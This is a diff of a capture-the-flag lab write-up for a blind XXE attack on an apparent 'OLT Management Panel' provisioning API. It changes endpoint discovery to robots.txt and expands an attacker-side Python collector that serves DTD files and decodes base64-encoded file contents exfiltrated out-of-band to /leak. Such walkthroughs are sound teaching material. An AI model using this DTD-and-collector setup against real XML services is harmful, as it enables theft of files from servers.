@@ -85,15 +85,20 @@ Two ports are open: SSH (22) and HTTP (80).
 
 ## Web Enumeration
 
-Navigating to `http://fiberrush.htb/` in a browser reveals a simple **OLT Management Panel** page with the message "Login is disabled in this demo build. Use the provisioning API."
+Navigating to `http://fiberrush.htb/` in a browser reveals a minimal **OLT Management Panel** page stating that login has been disabled (operator build). No obvious hints on the page itself.
 
-This hints at an API. Directory/endpoint enumeration (e.g., with `feroxbuster` or `gobuster`) reveals the API path:
+Checking for a `robots.txt` file:
 
 ```bash
-gobuster dir -u http://fiberrush.htb/ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
+curl http://fiberrush.htb/robots.txt
 ```
 
-We discover `POST /api/v1/onu/provision`. Testing it with a simple XML body:
+```
+User-agent: *
+Disallow: /api/v1/onu/provision
+```
+
+The `robots.txt` discloses a hidden API endpoint. Testing it with a simple XML body:
 
 ```bash
 curl -X POST http://fiberrush.htb/api/v1/onu/provision \
@@ -102,7 +107,7 @@ curl -X POST http://fiberrush.htb/api/v1/onu/provision \
 ```
 
 ```json
-{"status": "queued", "job_id": "a1b2c3d4"}
+{ "job_id": "a1b2c3d4", "status": "queued" }
 ```
 
 The endpoint accepts XML input and returns a generic response. The response does not reflect any input values back — this is a **blind** endpoint.
@@ -144,31 +149,48 @@ Create a DTD file `stage1.dtd` on the attacker machine:
 %exfil;
 ```
 
-Set up a collector script (`collector.py`) to decode incoming data:
+Set up a collector script (`collector.py`) on the attacker machine. This script serves DTD files from the current directory **and** decodes the OOB callback data:
 
 ```python
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib.parse import urlparse, parse_qs, unquote_to_bytes
 import base64
+import os
 
 class Handler(BaseHTTPRequestHandler):
     def do_GET(self):
         u = urlparse(self.path)
+
         if u.path == "/leak":
             d = parse_qs(u.query).get("d", [""])[0]
             raw = unquote_to_bytes(d)
             decoded = base64.b64decode(raw)
+            print("\n" + "=" * 60)
+            print("[+] EXFILTRATED DATA:")
+            print("=" * 60)
             print(decoded.decode("utf-8", errors="replace"))
-        self.send_response(200)
+            print("=" * 60 + "\n")
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(b"ok")
+            return
+
+        filepath = u.path.lstrip("/")
+        if filepath and os.path.isfile(filepath):
+            with open(filepath, "rb") as f:
+                data = f.read()
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(data)
+            return
+
+        self.send_response(404)
         self.end_headers()
-        self.wfile.write(b"ok")
 
-def main():
-    HTTPServer(("0.0.0.0", 8000), Handler).serve_forever()
-
-if __name__ == "__main__":
-    main()
+HTTPServer(("0.0.0.0", 8000), Handler).serve_forever()
 ```
+
+Create the `stage1.dtd` file in the same directory as `collector.py`, then start the collector:
 
 ```bash
 python3 collector.py
